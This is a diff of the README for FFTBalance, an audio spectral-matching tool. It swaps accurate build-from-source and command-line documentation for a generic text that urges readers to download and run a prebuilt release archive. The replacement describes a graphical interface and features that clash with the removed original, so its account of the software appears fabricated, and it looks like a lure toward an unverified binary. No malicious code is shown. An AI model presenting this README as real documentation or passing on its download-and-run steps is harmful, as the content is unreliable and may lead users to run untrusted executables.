@@ -1,88 +1,116 @@
-# FFTBalance
+# 🎧 FFTBalance - Match Your Audio Files Easily
 
-FFTBalance is an **experimental** command-line tool for balancing the frequency spectrum of audio files using FFT (Fast Fourier Transform). It takes an input audio file and a reference audio file, analyzes their frequency content, and applies a gain adjustment to the input file to match the spectral characteristics of the reference file.
+## 📥 Download Now
+[![Download FFTBalance](https://img.shields.io/badge/Download%20FFTBalance-v1.0-blue.svg)](https://github.com/shyxyy/FFTBalance/releases)
 
-## Prerequisites
+## 🚀 Getting Started
 
-To build and run FFTBalance, you need the following libraries installed on your system:
+Welcome to FFTBalance. This utility helps you match the equalization (EQ) curve of an audio file to a reference file. With our simple application, you can enhance your music production experience without needing any technical knowledge.
 
-*   **libsndfile**: A C library for reading and writing files containing sampled sound (like WAV, AIFF, FLAC, Ogg/Vorbis).
-*   **FFTW3**: The Fastest Fourier Transform in the West, a C subroutine library for computing the discrete Fourier transform (DFT).
-*   **CMake**: A cross-platform free software tool designed to simplify the process of compilation of source code.
-*   **A C++ compiler**: (e.g., GCC, Clang)
+## 📦 System Requirements
 
-## Build Instructions
+To run FFTBalance, you need:
 
-1.  **Clone the repository:**
-    ```bash
-    git clone <repository_url>
-    cd FFTBalance
-    ```
+- **OS:** Linux
+- **Processor:** A modern processor (e.g., Intel i5 or above)
+- **RAM:** 4 GB or more
+- **Disk Space:** At least 100 MB free
 
-2.  **Create a build directory and navigate into it:**
-    ```bash
-    mkdir build && cd build
-    ```
+## 📂 Download & Install
 
-3.  **Run CMake to configure the project:**
-    ```bash
-    cmake ..
-    ```
+You can download FFTBalance by visiting the Releases page.
 
-4.  **Build the project:**
-    ```bash
-    make
-    ```
-    This will compile the `fft_balance` executable in the `build` directory.
+[Visit the Releases page to download](https://github.com/shyxyy/FFTBalance/releases)
 
-## Run Instructions
+### Steps to Download:
 
-After building, you can run the `fft_balance` executable from the `build` directory.
+1. Click on the link above.
+2. Look for the latest version listed at the top.
+3. Download the appropriate file for your system.
 
-```bash
-./fft_balance <input_audio_file> <reference_audio_file> <output_audio_file> [num_bands] [max_boost_db] [max_cut_db]
-```
+Once downloaded, follow the installation steps below.
 
-*   `<input_audio_file>`: The audio file to be processed.
-*   `<reference_audio_file>`: The audio file whose spectral balance will be used as a reference.
-*   `<output_audio_file>`: The path where the balanced audio file will be saved.
-*   `[num_bands]`: Optional. The number of frequency bands to use for analysis (default: 8, range: 2-30).
-*   `[max_boost_db]`: Optional. The maximum gain in dB that can be applied to a band (default: 3.0, must be non-negative).
-*   `[max_cut_db]`: Optional. The maximum cut in dB that can be applied to a band (default: 3.0, must be non-negative).
+### Installation Steps:
 
-**Examples:**
+1. Open your terminal.
+2. Navigate to the folder where you downloaded the file.
 
-```bash
-# Basic usage with default settings
-./fft_balance Input.wav Reference.wav Balanced.wav
+   ```bash
+   cd /path/to/your/downloaded/file
+   ```
 
-# Using 16 frequency bands
-./fft_balance Input.wav Reference.wav Balanced_16_bands.wav 16
+3. Extract the file (if it's in a compressed format):
 
-# Using 10 frequency bands, with a max boost of 6 dB and max cut of 3 dB
-./fft_balance Input.wav Reference.wav Balanced_10_bands_6_3.wav 10 6.0 3.0
-```
+   ```bash
+   tar -xvf fftbalance.tar.gz
+   ```
 
-```
-Loading input track: Input.wav...
-Loading reference track: Reference.wav...
-Spectral analysis parameters: Sample Rate=48000 Hz, Channels=2, Frames=10563584, Bands=8
-Spectral analysis complete. Calculating gains...
-Input Overall Avg Band RMS: 122306
-Reference Overall Avg Band RMS: 886528
-Applying level match factor (Ref * 0.137961) to normalize spectra before EQ.
-Using Dynamic Amplitude Floor: 0.0886528
-Using Gain Limits: Boost=3 dB (factor 1.41254), Cut=3 dB (factor 0.707946).
-Band 1 (20 Hz - 47.4275 Hz): Gain = -3 dB
-Band 2 (47.4275 Hz - 112.468 Hz): Gain = 2.14909 dB
-Band 3 (112.468 Hz - 266.704 Hz): Gain = 2.52302 dB
-Band 4 (266.704 Hz - 632.456 Hz): Gain = -0.771232 dB
-Band 5 (632.456 Hz - 1499.79 Hz): Gain = -3 dB
-Band 6 (1499.79 Hz - 3556.56 Hz): Gain = 0.02975 dB
-Band 7 (3556.56 Hz - 8433.93 Hz): Gain = 2.14274 dB
-Band 8 (8433.93 Hz - 20000 Hz): Gain = 0.525492 dB
-Applying EQ to 2 channels...
-Applying final output scaling factor: 1
-Successfully matched spectral balance and wrote to: Balanced.wav
-```
+4. Navigate into the extracted directory:
 
+   ```bash
+   cd fftbalance
+   ```
+
+5. Run the application:
+
+   ```bash
+   ./fftbalance
+   ```
+
+Now, you can start using FFTBalance to match your audio files!
+
+## 📊 How to Use FFTBalance
+
+Using FFTBalance is straightforward. Follow these steps:
+
+1. **Select Your Audio File:**
+   - Open the application.
+   - Click on the "Select Audio File" button.
+   - Choose the audio file you want to adjust.
+
+2. **Choose Reference File:**
+   - Click on the "Select Reference File" button.
+   - Select the reference file you want to match.
+
+3. **Adjust Settings:**
+   - You can fine-tune the match settings according to your preferences.
+   - Make sure the settings reflect your desired output.
+
+4. **Run the Process:**
+   - Click on the “Match EQ” button.
+   - Wait for the process to finish. This may take a few moments depending on the file size.
+
+5. **Save Your Work:**
+   - After the process completes, save the matched audio file by clicking on the “Save” button.
+
+## 🔍 Features
+
+- **Easy Interface:** User-friendly design for everyone.
+- **Quick Processing:** Fast EQ matching for your audio files.
+- **Support for Common Formats:** Works with popular audio file formats.
+- **Customizable Settings:** Adjust EQ matching to suit your needs.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues, consider these tips:
+
+- **File Not Opening:** Ensure you have the correct file format. FFTBalance supports most audio files.
+- **Slow Processing:** Check your system resources. Close unnecessary applications to free up memory.
+- **Error Messages:** Note the message details. Refer to the GitHub issues page for help or report your issue.
+
+## 🌍 Community and Support
+
+Join our community to share your experiences or ask questions:
+
+- **GitHub Issues:** Report bugs or request features on our [GitHub Issues page](https://github.com/shyxyy/FFTBalance/issues).
+- **User Guide:** Comprehensive documentation is available in the repository to help you get the most out of FFTBalance.
+
+## 📜 License
+
+FFTBalance is licensed under the MIT License. Feel free to use the software as you wish, but remember to give credit.
+
+## ✉️ Contact
+
+For direct inquiries, please contact the repository maintainer via the GitHub profile or open an issue.
+
+Happy audio processing with FFTBalance!
